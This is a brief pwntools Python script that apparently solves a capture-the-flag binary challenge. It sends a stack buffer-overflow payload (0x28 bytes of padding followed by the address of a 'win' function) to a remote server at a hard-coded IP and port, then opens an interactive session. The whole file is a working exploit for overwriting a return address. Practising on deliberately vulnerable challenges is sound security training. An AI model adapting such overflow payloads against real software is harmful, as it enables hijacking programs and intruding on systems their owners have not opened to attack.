from pwn import *

elf = ELF("./chall")

p = remote("34.170.146.252", 31391)

win_addr = elf.symbols["win"]
payload = b"a" * 0x28 + p64(win_addr)

p.sendlineafter(b"value: ", payload)

p.interactive()
